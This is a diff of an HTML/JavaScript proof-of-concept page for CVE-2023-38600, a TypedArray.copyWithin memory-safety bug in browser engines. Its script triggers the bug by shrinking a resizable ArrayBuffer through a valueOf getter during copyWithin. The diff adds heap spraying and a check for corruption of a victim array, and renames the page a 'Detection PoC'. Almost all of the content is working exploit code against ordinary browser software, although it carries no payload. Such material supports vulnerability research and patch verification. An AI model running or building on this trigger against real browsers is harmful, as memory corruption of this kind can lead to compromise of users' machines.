@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2023-38600 PoC</title>
+    <title>CVE-2023-38600 Detection PoC</title>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
@@ -10,33 +10,52 @@
         window.onload = () => {
             log("Starting CVE-2023-38600 exploit...");
 
-            // Create a resizable ArrayBuffer
-            const buffer = new ArrayBuffer(16, { maxByteLength: 0x10000 });
-            const view = new Uint8Array(buffer);
+            // Victim array we'll watch for corruption
+            let victim = new Uint8Array(16);
+            victim.set([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]);
+            log("Victim before: " + victim);
 
-            // Resize the buffer during copyWithin via a getter
+            // Heap spraying for feng shui
+            let spray = [];
+            for (let i = 0; i < 1000; i++) {
+                spray.push(new Uint8Array(16));
+            }
+
+            // Evil object to resize buffer mid-copyWithin
             const evil = {
                 valueOf: () => {
-                    log("Resizing buffer mid-copyWithin!");
-                    buffer.resize(8); // Shrink buffer during operation
+                    buffer.resize(8); // Resize during copyWithin
                     return 0;
                 }
             };
 
+            // Resizable buffer
+            const buffer = new ArrayBuffer(16, { maxByteLength: 0x10000 });
+            const view = new Uint8Array(buffer);
+
             try {
-                // This will trigger the bug!
-                view.copyWithin(0, evil, 16);
-                log("Exploit finished (no crash or exception).");
+                view.copyWithin(0, evil, 16); // Trigger bug!
+                log("Exploit finished (no crash).");
             } catch (e) {
                 log("Exception caught: " + e.message);
             }
 
-            log("Exploit done.");
+            // Check if victim was overwritten
+            log("Victim after: " + victim);
+
+            // Compare first few bytes
+            let original = [1,2,3,4,5,6,7,8];
+            let current = Array.from(victim.slice(0, 8));
+            if (!original.every((v, i) => v === current[i])) {
+                log("⚠️ Memory corruption detected!");
+            } else {
+                log("No memory changes observed.");
+            }
         };
     </script>
 </head>
 <body>
     <h2>CVE-2023-38600 - TypedArray.copyWithin Integer Underflow</h2>
-    <p>Check console for results.</p>
+    <p>Check console for memory changes.</p>
 </body>
 </html>
